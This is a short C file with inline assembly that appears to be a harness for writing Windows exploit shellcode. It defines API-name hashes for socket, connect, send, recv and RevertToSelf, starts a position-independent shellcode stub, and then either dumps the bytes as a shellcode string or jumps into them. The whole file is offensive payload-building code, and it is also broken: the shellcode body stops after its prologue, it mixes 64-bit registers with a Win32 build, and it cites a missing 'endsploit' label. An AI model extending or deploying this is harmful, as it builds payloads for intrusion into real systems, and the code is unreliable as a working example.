#include <stdio.h>
#include <malloc.h>
#include <string.h>
#ifdef Win32
#include <windows.h>
#endif

void getprocaddr()
{

    /*GLOBAL DEFINES*/
    __asm__(".set KERNEL32HASH,      0x000d4e88\n\t"
            ".set NUMBEROFKERNEL32FUNCTIONS,0x4\n\t"
            ".set VIRTUALPROTECTHASH, 0x38d13c\n\t"
            ".set GETPROCADDRESSHASH,0x00348bfa\n\t"
            ".set LOADLIBRARYAHASH,  0x000d5786\n\t"
            ".set GETSYSTEMDIRECTORYAHASH, 0x069bb2e6\n\t"
            ".set WS232HASH,         0x0003ab08\n\t"
            ".set NUMBEROFWS232FUNCTIONS,0x5\n\t"
            ".set CONNECTHASH,       0x0000677c\n\t"
            ".set RECVHASH,          0x00000cc0\n\t"
            ".set SENDHASH,          0x00000cd8\n\t"
            ".set WSASTARTUPHASH,    0x00039314\n\t"
            ".set SOCKETHASH,        0x000036a4\n\t"
            ".set MSVCRTHASH, 0x00037908\n\t"
            ".set NUMBEROFMSVCRTFUNCTIONS, 0x01\n\t"
            ".set FREEHASH, 0x00000c4e\n\t"
            ".set ADVAPI32HASH, 0x000ca608\n\t"
            ".set NUMBEROFADVAPI32FUNCTIONS, 0x01\n\t"
            ".set REVERTTOSELFHASH, 0x000dcdb4");

    /* START OF SHELLCODE */
    __asm__("mainentrypoint:\n\t"
            "call geteip\n\t"
            "geteip:\n\t"
            "pop %rbx\n\t"
            "mov %rbx,%rsp\n\t"
            "sub $0x1000,%rsp"
    );
    
}

int main()
{
    unsigned char buffer[4000]; 
    unsigned char * p;
    int i;
    char *mbuf,*mbuf2;
    int error=0;
    /*getprocaddr();*/
    memcpy(buffer,getprocaddr,2400);
    p=buffer;
    p+=3; /*skip prelude of function*/

    /*#define DOPRINT*/

#ifdef DOPRINT

    /*gdb ) printf "%d\n", endsploit - mainentrypoint -1 */

    printf("\"");
    for (i=0; i<666; i++)
    {
        printf("\\x%2.2x",*p);
        if ((i+1)%8==0)
            printf("\"\nshellcode+=\"");
        p++;
    }

    printf("\"\n");
#endif

#define DOCALL
#ifdef DOCALL
    ((void(*)())(p)) ();
#endif


}